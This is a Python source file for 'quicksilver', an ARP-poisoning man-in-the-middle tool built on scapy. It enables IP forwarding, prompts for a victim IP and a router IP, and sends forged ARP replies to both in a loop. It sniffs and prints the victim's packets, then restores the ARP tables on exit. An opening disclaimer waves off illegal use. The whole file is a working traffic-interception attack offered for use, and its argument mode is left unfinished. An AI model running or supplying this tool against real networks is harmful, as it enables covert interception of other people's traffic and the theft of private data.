#NOTE: Do not use for illegal activities, or if you do, don't blame me in any way, including saying I encouraged you. Your stupidity is in your hands. 
from scapy.all import *
import sys
import os
def banner():
        print(" _____ _   _ _____ _____  _   __ _____ _____ _     _   _ ___________ ")
        print("|  _  | | | |_   _/  __ \| | / //  ___|_   _| |   | | | |  ___| ___ \ ")
        print("| | | | | | | | | | /  \/| |/ / \ `--.  | | | |   | | | | |__ | |_/ /")
        print("| | | | | | | | | | |    |    \  `--. \ | | | |   | | | |  __||    /")
        print("\ \/' / |_| |_| |_| \__/\| |\  \/\__/ /_| |_| |___\ \_/ / |___| |\ \ ")
        print(" \_/\_\\___/ \___/ \____/\_| \_/\____/ \___/\_____/\___/\____/\_| \_|")
import time
import random as r
cmd="False"
banner()
if "-h" in sys.argv[0:]:
	print("quicksilver - a MITM tool for easy monitoring, modifying, and intercepting network traffic to and from a target.")
	print("USAGE:\npython quicksilver.py\n")
	print("OPTIONS:")
	print("-v | Verbose mode")
	print("-d | Debug mode  (You won't need this)")
	print("-h | Display this help menu")
	print("-i | Interactive mode (DEFAULT)")
	print("-c | Argument mode\n")
	print("ARGUMENT MODE:")
	print("python quicksilver.py [TARGET IP] [ROUTER IP] (LOGFILE) -c (-v)")
	sys.exit(1)
if "-v" in sys.argv[0:]:
	verbose="True"
else:
	verbose="False"
if "-d" in sys.argv[0:]:
	verbose="True"
	debug="True"
else:
	debug="False"
if "-c" in sys.argv[0:]:
	cmd="True"
elif "-i" in sys.argv[0:]:
	cmd="False"

try:
	if cmd=="False":
		os.system("netstat -rn")
		os.system("airmon-ng")
        	interface = raw_input("[*] Enter Desired Interface: ")
        	victimIP = raw_input("[*] Enter Victim IP: ")
        	gateIP = raw_input("[*] Enter Router IP: ")

except KeyboardInterrupt:
        print "\n[*] User Requested Shutdown"
        print "[*] Exiting..."
        sys.exit(1)

print "\n[*] Enabling IP Forwarding...\n"
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def get_mac(IP):
        conf.verb = 0
        ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = interface, inter = 0.1)
        for snd,rcv in ans:
                return rcv.sprintf(r"%Ether.src%")
def reARP():
        print "\n[*] Restoring Targets..."
        victimMAC = get_mac(victimIP)
        gateMAC = get_mac(gateIP)
        send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
        send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
        print "[*] Disabling IP Forwarding..."
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print "[*] Shutting Down..."
        sys.exit(1)

def trick(gm, vm):
        send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
        send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))

victimMAC=get_mac(victimIP)
gateMAC=get_mac(gateIP)

def getpacket():
	y=20 #Makes it easier to change # of packets grabbed at once (individual is slow but high numbers even worse)
	pkt=sniff(count=y)
	x=0
	while x<y:
		CtR="False"
		RtC="False"
		if str(victimMAC) in str(pkt[x].src) or str(gateMAC) in str(pkt[x].dst):
			CtR="True"
		elif str(gateMAC) in str(pkt[x].src) or str(victimMAC) in str(pkt[x].dst):
			RtC="True"
		else:
			CtR="False"
			RtC="False"
		if CtR=='True' or RtC=='True' or debug=="True":
			print pkt[x].summary()
			if debug=="True":
				print("CtR  | RtC")
				print(CtR,RtC)
			if verbose=="True":
				print str(pkt[x].show()) +"\n"
				print str(pkt[x].command())
		x=x+1
def mitm():
        try:
                victimMAC = get_mac(victimIP)
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
                print "[!] Couldn't Find Victim MAC Address"
                print "[!] Exiting..."
                sys.exit(1)
        try:
                gateMAC = get_mac(gateIP)
        except Exception:
                os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")            
                print "[!] Couldn't Find Gateway MAC Address"
                print "[!] Exiting..."
                sys.exit(1)
        print "[*] Poisoning Targets...\n"
	print("[*] MITM Attack started. Beginning target sniff...\n")
        while 1:
                try:
                        trick(gateMAC, victimMAC)
                        getpacket()
                        time.sleep(.31) #originally 1.5
			getpacket()
                except KeyboardInterrupt:
                        reARP()
                        break
mitm()
